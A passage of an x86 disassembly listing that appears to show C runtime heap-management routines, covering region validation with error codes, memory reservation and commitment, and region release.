  408360:	eb d5                	jmp    0x408337
  408362:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  408366:	0f 8c 31 04 00 00    	jl     0x40879d
  40836c:	68 00 80 00 00       	push   $0x8000
  408371:	8b 8d d8 fe ff ff    	mov    -0x128(%ebp),%ecx
  408377:	51                   	push   %ecx
  408378:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  40837e:	85 c0                	test   %eax,%eax
  408380:	74 0a                	je     0x40838c
  408382:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  408387:	e9 ad 04 00 00       	jmp    0x408839
  40838c:	8b 95 d8 fe ff ff    	mov    -0x128(%ebp),%edx
  408392:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408395:	c7 85 c0 fe ff ff 00 	movl   $0x0,-0x140(%ebp)
  40839c:	00 00 00 
  40839f:	eb 0f                	jmp    0x4083b0
  4083a1:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  4083a7:	83 c0 01             	add    $0x1,%eax
  4083aa:	89 85 c0 fe ff ff    	mov    %eax,-0x140(%ebp)
  4083b0:	83 bd c0 fe ff ff 08 	cmpl   $0x8,-0x140(%ebp)
  4083b7:	0f 8d 77 01 00 00    	jge    0x408534
  4083bd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4083c0:	83 c1 0c             	add    $0xc,%ecx
  4083c3:	89 8d d0 fe ff ff    	mov    %ecx,-0x130(%ebp)
  4083c9:	8b 95 d0 fe ff ff    	mov    -0x130(%ebp),%edx
  4083cf:	81 c2 f0 0f 00 00    	add    $0xff0,%edx
  4083d5:	89 95 c8 fe ff ff    	mov    %edx,-0x138(%ebp)
  4083db:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  4083e1:	83 78 fc ff          	cmpl   $0xffffffff,-0x4(%eax)
  4083e5:	75 0b                	jne    0x4083f2
  4083e7:	8b 8d c8 fe ff ff    	mov    -0x138(%ebp),%ecx
  4083ed:	83 39 ff             	cmpl   $0xffffffff,(%ecx)
  4083f0:	74 0a                	je     0x4083fc
  4083f2:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  4083f7:	e9 3d 04 00 00       	jmp    0x408839
  4083fc:	8b 95 d0 fe ff ff    	mov    -0x130(%ebp),%edx
  408402:	8b 02                	mov    (%edx),%eax
  408404:	89 85 b8 fe ff ff    	mov    %eax,-0x148(%ebp)
  40840a:	8b 8d b8 fe ff ff    	mov    -0x148(%ebp),%ecx
  408410:	89 8d ac fe ff ff    	mov    %ecx,-0x154(%ebp)
  408416:	8b 95 ac fe ff ff    	mov    -0x154(%ebp),%edx
  40841c:	83 e2 01             	and    $0x1,%edx
  40841f:	85 d2                	test   %edx,%edx
  408421:	74 36                	je     0x408459
  408423:	8b 85 b8 fe ff ff    	mov    -0x148(%ebp),%eax
  408429:	83 e8 01             	sub    $0x1,%eax
  40842c:	89 85 b8 fe ff ff    	mov    %eax,-0x148(%ebp)
  408432:	81 bd b8 fe ff ff 00 	cmpl   $0x400,-0x148(%ebp)
  408439:	04 00 00 
  40843c:	7e 0a                	jle    0x408448
  40843e:	b8 fa ff ff ff       	mov    $0xfffffffa,%eax
  408443:	e9 f1 03 00 00       	jmp    0x408839
  408448:	8b 8d d4 fe ff ff    	mov    -0x12c(%ebp),%ecx
  40844e:	83 c1 01             	add    $0x1,%ecx
  408451:	89 8d d4 fe ff ff    	mov    %ecx,-0x12c(%ebp)
  408457:	eb 42                	jmp    0x40849b
  408459:	8b 95 b8 fe ff ff    	mov    -0x148(%ebp),%edx
  40845f:	c1 fa 04             	sar    $0x4,%edx
  408462:	83 ea 01             	sub    $0x1,%edx
  408465:	89 95 b4 fe ff ff    	mov    %edx,-0x14c(%ebp)
  40846b:	83 bd b4 fe ff ff 3f 	cmpl   $0x3f,-0x14c(%ebp)
  408472:	7e 0a                	jle    0x40847e
  408474:	c7 85 b4 fe ff ff 3f 	movl   $0x3f,-0x14c(%ebp)
  40847b:	00 00 00 
  40847e:	8b 85 b4 fe ff ff    	mov    -0x14c(%ebp),%eax
  408484:	8b 8c 85 e8 fe ff ff 	mov    -0x118(%ebp,%eax,4),%ecx
  40848b:	83 c1 01             	add    $0x1,%ecx
  40848e:	8b 95 b4 fe ff ff    	mov    -0x14c(%ebp),%edx
  408494:	89 8c 95 e8 fe ff ff 	mov    %ecx,-0x118(%ebp,%edx,4)
  40849b:	83 bd b8 fe ff ff 10 	cmpl   $0x10,-0x148(%ebp)
  4084a2:	7c 19                	jl     0x4084bd
  4084a4:	8b 85 b8 fe ff ff    	mov    -0x148(%ebp),%eax
  4084aa:	83 e0 0f             	and    $0xf,%eax
  4084ad:	85 c0                	test   %eax,%eax
  4084af:	75 0c                	jne    0x4084bd
  4084b1:	81 bd b8 fe ff ff f0 	cmpl   $0xff0,-0x148(%ebp)
  4084b8:	0f 00 00 
  4084bb:	7e 0a                	jle    0x4084c7
  4084bd:	b8 f9 ff ff ff       	mov    $0xfffffff9,%eax
  4084c2:	e9 72 03 00 00       	jmp    0x408839
  4084c7:	8b 8d d0 fe ff ff    	mov    -0x130(%ebp),%ecx
  4084cd:	03 8d b8 fe ff ff    	add    -0x148(%ebp),%ecx
  4084d3:	8b 51 fc             	mov    -0x4(%ecx),%edx
  4084d6:	3b 95 ac fe ff ff    	cmp    -0x154(%ebp),%edx
  4084dc:	74 0a                	je     0x4084e8
  4084de:	b8 f8 ff ff ff       	mov    $0xfffffff8,%eax
  4084e3:	e9 51 03 00 00       	jmp    0x408839
  4084e8:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  4084ee:	03 85 b8 fe ff ff    	add    -0x148(%ebp),%eax
  4084f4:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  4084fa:	8b 8d d0 fe ff ff    	mov    -0x130(%ebp),%ecx
  408500:	3b 8d c8 fe ff ff    	cmp    -0x138(%ebp),%ecx
  408506:	0f 82 f0 fe ff ff    	jb     0x4083fc
  40850c:	8b 95 d0 fe ff ff    	mov    -0x130(%ebp),%edx
  408512:	3b 95 c8 fe ff ff    	cmp    -0x138(%ebp),%edx
  408518:	74 0a                	je     0x408524
  40851a:	b8 f8 ff ff ff       	mov    $0xfffffff8,%eax
  40851f:	e9 15 03 00 00       	jmp    0x408839
  408524:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408527:	05 00 10 00 00       	add    $0x1000,%eax
  40852c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40852f:	e9 6d fe ff ff       	jmp    0x4083a1
  408534:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408537:	8b 11                	mov    (%ecx),%edx
  408539:	3b 95 d4 fe ff ff    	cmp    -0x12c(%ebp),%edx
  40853f:	74 0a                	je     0x40854b
  408541:	b8 f7 ff ff ff       	mov    $0xfffffff7,%eax
  408546:	e9 ee 02 00 00       	jmp    0x408839
  40854b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40854e:	89 85 cc fe ff ff    	mov    %eax,-0x134(%ebp)
  408554:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40855b:	eb 09                	jmp    0x408566
  40855d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408560:	83 c1 01             	add    $0x1,%ecx
  408563:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  408566:	83 7d ec 40          	cmpl   $0x40,-0x14(%ebp)
  40856a:	0f 8d 2d 02 00 00    	jge    0x40879d
  408570:	c7 85 98 fe ff ff 00 	movl   $0x0,-0x168(%ebp)
  408577:	00 00 00 
  40857a:	8b 95 cc fe ff ff    	mov    -0x134(%ebp),%edx
  408580:	89 95 d0 fe ff ff    	mov    %edx,-0x130(%ebp)
  408586:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  40858c:	8b 48 04             	mov    0x4(%eax),%ecx
  40858f:	89 8d a4 fe ff ff    	mov    %ecx,-0x15c(%ebp)
  408595:	8b 95 a4 fe ff ff    	mov    -0x15c(%ebp),%edx
  40859b:	3b 95 cc fe ff ff    	cmp    -0x134(%ebp),%edx
  4085a1:	0f 84 23 01 00 00    	je     0x4086ca
  4085a7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4085aa:	8b 8d 98 fe ff ff    	mov    -0x168(%ebp),%ecx
  4085b0:	3b 8c 85 e8 fe ff ff 	cmp    -0x118(%ebp,%eax,4),%ecx
  4085b7:	0f 84 0d 01 00 00    	je     0x4086ca
  4085bd:	8b 95 a4 fe ff ff    	mov    -0x15c(%ebp),%edx
  4085c3:	3b 95 d8 fe ff ff    	cmp    -0x128(%ebp),%edx
  4085c9:	72 13                	jb     0x4085de
  4085cb:	8b 85 d8 fe ff ff    	mov    -0x128(%ebp),%eax
  4085d1:	05 00 80 00 00       	add    $0x8000,%eax
  4085d6:	39 85 a4 fe ff ff    	cmp    %eax,-0x15c(%ebp)
  4085dc:	72 0a                	jb     0x4085e8
  4085de:	b8 f6 ff ff ff       	mov    $0xfffffff6,%eax
  4085e3:	e9 51 02 00 00       	jmp    0x408839
  4085e8:	8b 8d a4 fe ff ff    	mov    -0x15c(%ebp),%ecx
  4085ee:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  4085f4:	89 8d 9c fe ff ff    	mov    %ecx,-0x164(%ebp)
  4085fa:	8b 95 9c fe ff ff    	mov    -0x164(%ebp),%edx
  408600:	83 c2 0c             	add    $0xc,%edx
  408603:	89 55 f0             	mov    %edx,-0x10(%ebp)
  408606:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408609:	05 f0 0f 00 00       	add    $0xff0,%eax
  40860e:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
  408614:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408617:	3b 8d dc fe ff ff    	cmp    -0x124(%ebp),%ecx
  40861d:	74 1f                	je     0x40863e
  40861f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408622:	3b 95 a4 fe ff ff    	cmp    -0x15c(%ebp),%edx
  408628:	75 02                	jne    0x40862c
  40862a:	eb 12                	jmp    0x40863e
  40862c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40862f:	8b 08                	mov    (%eax),%ecx
  408631:	83 e1 fe             	and    $0xfffffffe,%ecx
  408634:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408637:	03 d1                	add    %ecx,%edx
  408639:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40863c:	eb d6                	jmp    0x408614
  40863e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408641:	3b 85 dc fe ff ff    	cmp    -0x124(%ebp),%eax
  408647:	75 0a                	jne    0x408653
  408649:	b8 f5 ff ff ff       	mov    $0xfffffff5,%eax
  40864e:	e9 e6 01 00 00       	jmp    0x408839
  408653:	8b 8d a4 fe ff ff    	mov    -0x15c(%ebp),%ecx
  408659:	8b 11                	mov    (%ecx),%edx
  40865b:	c1 fa 04             	sar    $0x4,%edx
  40865e:	83 ea 01             	sub    $0x1,%edx
  408661:	89 95 b4 fe ff ff    	mov    %edx,-0x14c(%ebp)
  408667:	83 bd b4 fe ff ff 3f 	cmpl   $0x3f,-0x14c(%ebp)
  40866e:	7e 0a                	jle    0x40867a
  408670:	c7 85 b4 fe ff ff 3f 	movl   $0x3f,-0x14c(%ebp)
  408677:	00 00 00 
  40867a:	8b 85 b4 fe ff ff    	mov    -0x14c(%ebp),%eax
  408680:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  408683:	74 0a                	je     0x40868f
  408685:	b8 f4 ff ff ff       	mov    $0xfffffff4,%eax
  40868a:	e9 aa 01 00 00       	jmp    0x408839
  40868f:	8b 8d a4 fe ff ff    	mov    -0x15c(%ebp),%ecx
  408695:	8b 51 08             	mov    0x8(%ecx),%edx
  408698:	3b 95 d0 fe ff ff    	cmp    -0x130(%ebp),%edx
  40869e:	74 0a                	je     0x4086aa
  4086a0:	b8 f3 ff ff ff       	mov    $0xfffffff3,%eax
  4086a5:	e9 8f 01 00 00       	jmp    0x408839
  4086aa:	8b 85 a4 fe ff ff    	mov    -0x15c(%ebp),%eax
  4086b0:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  4086b6:	8b 8d 98 fe ff ff    	mov    -0x168(%ebp),%ecx
  4086bc:	83 c1 01             	add    $0x1,%ecx
  4086bf:	89 8d 98 fe ff ff    	mov    %ecx,-0x168(%ebp)
  4086c5:	e9 bc fe ff ff       	jmp    0x408586
  4086ca:	83 bd 98 fe ff ff 00 	cmpl   $0x0,-0x168(%ebp)
  4086d1:	74 6e                	je     0x408741
  4086d3:	83 7d ec 20          	cmpl   $0x20,-0x14(%ebp)
  4086d7:	7d 32                	jge    0x40870b
  4086d9:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4086de:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4086e1:	d3 ea                	shr    %cl,%edx
  4086e3:	8b 85 e4 fe ff ff    	mov    -0x11c(%ebp),%eax
  4086e9:	0b c2                	or     %edx,%eax
  4086eb:	89 85 e4 fe ff ff    	mov    %eax,-0x11c(%ebp)
  4086f1:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4086f6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4086f9:	d3 ea                	shr    %cl,%edx
  4086fb:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  408701:	0b c2                	or     %edx,%eax
  408703:	89 85 bc fe ff ff    	mov    %eax,-0x144(%ebp)
  408709:	eb 36                	jmp    0x408741
  40870b:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40870e:	83 e9 20             	sub    $0x20,%ecx
  408711:	ba 00 00 00 80       	mov    $0x80000000,%edx
  408716:	d3 ea                	shr    %cl,%edx
  408718:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  40871e:	0b c2                	or     %edx,%eax
  408720:	89 85 b0 fe ff ff    	mov    %eax,-0x150(%ebp)
  408726:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408729:	83 e9 20             	sub    $0x20,%ecx
  40872c:	ba 00 00 00 80       	mov    $0x80000000,%edx
  408731:	d3 ea                	shr    %cl,%edx
  408733:	8b 85 a8 fe ff ff    	mov    -0x158(%ebp),%eax
  408739:	0b c2                	or     %edx,%eax
  40873b:	89 85 a8 fe ff ff    	mov    %eax,-0x158(%ebp)
  408741:	8b 8d d0 fe ff ff    	mov    -0x130(%ebp),%ecx
  408747:	8b 51 04             	mov    0x4(%ecx),%edx
  40874a:	3b 95 cc fe ff ff    	cmp    -0x134(%ebp),%edx
  408750:	75 12                	jne    0x408764
  408752:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408755:	8b 8d 98 fe ff ff    	mov    -0x168(%ebp),%ecx
  40875b:	3b 8c 85 e8 fe ff ff 	cmp    -0x118(%ebp,%eax,4),%ecx
  408762:	74 0a                	je     0x40876e
  408764:	b8 f2 ff ff ff       	mov    $0xfffffff2,%eax
  408769:	e9 cb 00 00 00       	jmp    0x408839
  40876e:	8b 95 cc fe ff ff    	mov    -0x134(%ebp),%edx
  408774:	8b 42 08             	mov    0x8(%edx),%eax
  408777:	3b 85 d0 fe ff ff    	cmp    -0x130(%ebp),%eax
  40877d:	74 0a                	je     0x408789
  40877f:	b8 f1 ff ff ff       	mov    $0xfffffff1,%eax
  408784:	e9 b0 00 00 00       	jmp    0x408839
  408789:	8b 8d cc fe ff ff    	mov    -0x134(%ebp),%ecx
  40878f:	83 c1 08             	add    $0x8,%ecx
  408792:	89 8d cc fe ff ff    	mov    %ecx,-0x134(%ebp)
  408798:	e9 c0 fd ff ff       	jmp    0x40855d
  40879d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4087a0:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  4087a6:	8b 8d e4 fe ff ff    	mov    -0x11c(%ebp),%ecx
  4087ac:	3b 4c 90 44          	cmp    0x44(%eax,%edx,4),%ecx
  4087b0:	75 18                	jne    0x4087ca
  4087b2:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4087b5:	8b 85 a0 fe ff ff    	mov    -0x160(%ebp),%eax
  4087bb:	8b 8d b0 fe ff ff    	mov    -0x150(%ebp),%ecx
  4087c1:	3b 8c 90 c4 00 00 00 	cmp    0xc4(%eax,%edx,4),%ecx
  4087c8:	74 07                	je     0x4087d1
  4087ca:	b8 f0 ff ff ff       	mov    $0xfffffff0,%eax
  4087cf:	eb 68                	jmp    0x408839
  4087d1:	8b 95 d8 fe ff ff    	mov    -0x128(%ebp),%edx
  4087d7:	81 c2 00 80 00 00    	add    $0x8000,%edx
  4087dd:	89 95 d8 fe ff ff    	mov    %edx,-0x128(%ebp)
  4087e3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4087e6:	05 04 02 00 00       	add    $0x204,%eax
  4087eb:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4087ee:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4087f1:	d1 e1                	shl    $1,%ecx
  4087f3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4087f6:	e9 ff fa ff ff       	jmp    0x4082fa
  4087fb:	8b 95 c4 fe ff ff    	mov    -0x13c(%ebp),%edx
  408801:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
  408807:	3b 02                	cmp    (%edx),%eax
  408809:	75 11                	jne    0x40881c
  40880b:	8b 8d c4 fe ff ff    	mov    -0x13c(%ebp),%ecx
  408811:	8b 95 a8 fe ff ff    	mov    -0x158(%ebp),%edx
  408817:	3b 51 04             	cmp    0x4(%ecx),%edx
  40881a:	74 07                	je     0x408823
  40881c:	b8 ef ff ff ff       	mov    $0xffffffef,%eax
  408821:	eb 16                	jmp    0x408839
  408823:	8b 85 c4 fe ff ff    	mov    -0x13c(%ebp),%eax
  408829:	83 c0 14             	add    $0x14,%eax
  40882c:	89 85 c4 fe ff ff    	mov    %eax,-0x13c(%ebp)
  408832:	e9 2c fa ff ff       	jmp    0x408263
  408837:	33 c0                	xor    %eax,%eax
  408839:	8b e5                	mov    %ebp,%esp
  40883b:	5d                   	pop    %ebp
  40883c:	c3                   	ret
  40883d:	cc                   	int3
  40883e:	cc                   	int3
  40883f:	cc                   	int3
  408840:	55                   	push   %ebp
  408841:	8b ec                	mov    %esp,%ebp
  408843:	83 ec 0c             	sub    $0xc,%esp
  408846:	83 3d c0 b1 45 00 ff 	cmpl   $0xffffffff,0x45b1c0
  40884d:	75 09                	jne    0x408858
  40884f:	c7 45 f4 b0 b1 45 00 	movl   $0x45b1b0,-0xc(%ebp)
  408856:	eb 23                	jmp    0x40887b
  408858:	68 20 20 00 00       	push   $0x2020
  40885d:	6a 00                	push   $0x0
  40885f:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  408864:	50                   	push   %eax
  408865:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  40886b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40886e:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408872:	75 07                	jne    0x40887b
  408874:	33 c0                	xor    %eax,%eax
  408876:	e9 9f 01 00 00       	jmp    0x408a1a
  40887b:	6a 04                	push   $0x4
  40887d:	68 00 20 00 00       	push   $0x2000
  408882:	68 00 00 40 00       	push   $0x400000
  408887:	6a 00                	push   $0x0
  408889:	ff 15 08 f0 40 00    	call   *0x40f008
  40888f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408892:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  408896:	0f 84 60 01 00 00    	je     0x4089fc
  40889c:	6a 04                	push   $0x4
  40889e:	68 00 10 00 00       	push   $0x1000
  4088a3:	68 00 00 01 00       	push   $0x10000
  4088a8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4088ab:	51                   	push   %ecx
  4088ac:	ff 15 08 f0 40 00    	call   *0x40f008
  4088b2:	85 c0                	test   %eax,%eax
  4088b4:	0f 84 31 01 00 00    	je     0x4089eb
  4088ba:	81 7d f4 b0 b1 45 00 	cmpl   $0x45b1b0,-0xc(%ebp)
  4088c1:	75 28                	jne    0x4088eb
  4088c3:	83 3d b0 b1 45 00 00 	cmpl   $0x0,0x45b1b0
  4088ca:	75 0a                	jne    0x4088d6
  4088cc:	c7 05 b0 b1 45 00 b0 	movl   $0x45b1b0,0x45b1b0
  4088d3:	b1 45 00 
  4088d6:	83 3d b4 b1 45 00 00 	cmpl   $0x0,0x45b1b4
  4088dd:	75 0a                	jne    0x4088e9
  4088df:	c7 05 b4 b1 45 00 b0 	movl   $0x45b1b0,0x45b1b4
  4088e6:	b1 45 00 
  4088e9:	eb 29                	jmp    0x408914
  4088eb:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4088ee:	c7 02 b0 b1 45 00    	movl   $0x45b1b0,(%edx)
  4088f4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4088f7:	8b 0d b4 b1 45 00    	mov    0x45b1b4,%ecx
  4088fd:	89 48 04             	mov    %ecx,0x4(%eax)
  408900:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408903:	89 15 b4 b1 45 00    	mov    %edx,0x45b1b4
  408909:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40890c:	8b 48 04             	mov    0x4(%eax),%ecx
  40890f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408912:	89 11                	mov    %edx,(%ecx)
  408914:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408917:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40891a:	89 48 10             	mov    %ecx,0x10(%eax)
  40891d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408920:	81 c2 00 00 40 00    	add    $0x400000,%edx
  408926:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408929:	89 50 14             	mov    %edx,0x14(%eax)
  40892c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40892f:	83 c1 18             	add    $0x18,%ecx
  408932:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408935:	89 4a 08             	mov    %ecx,0x8(%edx)
  408938:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40893b:	05 98 00 00 00       	add    $0x98,%eax
  408940:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408943:	89 41 0c             	mov    %eax,0xc(%ecx)
  408946:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40894d:	eb 09                	jmp    0x408958
  40894f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408952:	83 c2 01             	add    $0x1,%edx
  408955:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408958:	81 7d f8 00 04 00 00 	cmpl   $0x400,-0x8(%ebp)
  40895f:	7d 34                	jge    0x408995
  408961:	83 7d f8 10          	cmpl   $0x10,-0x8(%ebp)
  408965:	7d 10                	jge    0x408977
  408967:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40896a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40896d:	c7 44 c1 18 f0 00 00 	movl   $0xf0,0x18(%ecx,%eax,8)
  408974:	00 
  408975:	eb 0e                	jmp    0x408985
  408977:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40897a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40897d:	c7 44 d0 18 ff ff ff 	movl   $0xffffffff,0x18(%eax,%edx,8)
  408984:	ff 
  408985:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408988:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40898b:	c7 44 ca 1c f1 00 00 	movl   $0xf1,0x1c(%edx,%ecx,8)
  408992:	00 
  408993:	eb ba                	jmp    0x40894f
  408995:	68 00 00 01 00       	push   $0x10000
  40899a:	6a 00                	push   $0x0
  40899c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40899f:	50                   	push   %eax
  4089a0:	e8 5b a8 ff ff       	call   0x403200
  4089a5:	83 c4 0c             	add    $0xc,%esp
  4089a8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4089ab:	8b 51 10             	mov    0x10(%ecx),%edx
  4089ae:	81 c2 00 00 01 00    	add    $0x10000,%edx
  4089b4:	39 55 fc             	cmp    %edx,-0x4(%ebp)
  4089b7:	73 2d                	jae    0x4089e6
  4089b9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4089bc:	83 c0 08             	add    $0x8,%eax
  4089bf:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4089c2:	89 01                	mov    %eax,(%ecx)
  4089c4:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4089c7:	c7 42 04 f0 00 00 00 	movl   $0xf0,0x4(%edx)
  4089ce:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4089d1:	c6 80 f8 00 00 00 ff 	movb   $0xff,0xf8(%eax)
  4089d8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4089db:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  4089e1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4089e4:	eb c2                	jmp    0x4089a8
  4089e6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4089e9:	eb 2f                	jmp    0x408a1a
  4089eb:	68 00 80 00 00       	push   $0x8000
  4089f0:	6a 00                	push   $0x0
  4089f2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4089f5:	52                   	push   %edx
  4089f6:	ff 15 0c f0 40 00    	call   *0x40f00c
  4089fc:	81 7d f4 b0 b1 45 00 	cmpl   $0x45b1b0,-0xc(%ebp)
  408a03:	74 13                	je     0x408a18
  408a05:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408a08:	50                   	push   %eax
  408a09:	6a 00                	push   $0x0
  408a0b:	8b 0d 4c f2 45 00    	mov    0x45f24c,%ecx
  408a11:	51                   	push   %ecx
  408a12:	ff 15 40 f0 40 00    	call   *0x40f040
  408a18:	33 c0                	xor    %eax,%eax
  408a1a:	8b e5                	mov    %ebp,%esp
  408a1c:	5d                   	pop    %ebp
  408a1d:	c3                   	ret
  408a1e:	cc                   	int3
  408a1f:	cc                   	int3
  408a20:	55                   	push   %ebp
  408a21:	8b ec                	mov    %esp,%ebp
  408a23:	68 00 80 00 00       	push   $0x8000
  408a28:	6a 00                	push   $0x0
  408a2a:	8b 45 08             	mov    0x8(%ebp),%eax
  408a2d:	8b 48 10             	mov    0x10(%eax),%ecx
  408a30:	51                   	push   %ecx
  408a31:	ff 15 0c f0 40 00    	call   *0x40f00c
  408a37:	8b 15 d0 d1 45 00    	mov    0x45d1d0,%edx
  408a3d:	3b 55 08             	cmp    0x8(%ebp),%edx
  408a40:	75 0c                	jne    0x408a4e
  408a42:	8b 45 08             	mov    0x8(%ebp),%eax
  408a45:	8b 48 04             	mov    0x4(%eax),%ecx
  408a48:	89 0d d0 d1 45 00    	mov    %ecx,0x45d1d0
  408a4e:	81 7d 08 b0 b1 45 00 	cmpl   $0x45b1b0,0x8(%ebp)
  408a55:	74 30                	je     0x408a87
  408a57:	8b 55 08             	mov    0x8(%ebp),%edx
  408a5a:	8b 42 04             	mov    0x4(%edx),%eax
  408a5d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408a60:	8b 11                	mov    (%ecx),%edx
  408a62:	89 10                	mov    %edx,(%eax)
  408a64:	8b 45 08             	mov    0x8(%ebp),%eax
  408a67:	8b 08                	mov    (%eax),%ecx
  408a69:	8b 55 08             	mov    0x8(%ebp),%edx
  408a6c:	8b 42 04             	mov    0x4(%edx),%eax
  408a6f:	89 41 04             	mov    %eax,0x4(%ecx)
  408a72:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408a75:	51                   	push   %ecx
  408a76:	6a 00                	push   $0x0
  408a78:	8b 15 4c f2 45 00    	mov    0x45f24c,%edx
  408a7e:	52                   	push   %edx
  408a7f:	ff 15 40 f0 40 00    	call   *0x40f040
  408a85:	eb 0a                	jmp    0x408a91
  408a87:	c7 05 c0 b1 45 00 ff 	movl   $0xffffffff,0x45b1c0
  408a8e:	ff ff ff 
  408a91:	5d                   	pop    %ebp
  408a92:	c3                   	ret
  408a93:	cc                   	int3
  408a94:	cc                   	int3
  408a95:	cc                   	int3
  408a96:	cc                   	int3
  408a97:	cc                   	int3
  408a98:	cc                   	int3
  408a99:	cc                   	int3
  408a9a:	cc                   	int3
  408a9b:	cc                   	int3
  408a9c:	cc                   	int3
  408a9d:	cc                   	int3
  408a9e:	cc                   	int3
  408a9f:	cc                   	int3
  408aa0:	55                   	push   %ebp
  408aa1:	8b ec                	mov    %esp,%ebp
  408aa3:	83 ec 14             	sub    $0x14,%esp
  408aa6:	a1 b4 b1 45 00       	mov    0x45b1b4,%eax
  408aab:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408aae:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408ab1:	83 79 10 ff          	cmpl   $0xffffffff,0x10(%ecx)
  408ab5:	0f 84 23 01 00 00    	je     0x408bde
  408abb:	c7 45 f4 ff 03 00 00 	movl   $0x3ff,-0xc(%ebp)
  408ac2:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  408ac9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408acc:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408acf:	8d 4c d0 18          	lea    0x18(%eax,%edx,8),%ecx
  408ad3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408ad6:	eb 12                	jmp    0x408aea
  408ad8:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408adb:	83 ea 01             	sub    $0x1,%edx
  408ade:	89 55 f4             	mov    %edx,-0xc(%ebp)
  408ae1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ae4:	83 e8 08             	sub    $0x8,%eax
  408ae7:	89 45 fc             	mov    %eax,-0x4(%ebp)
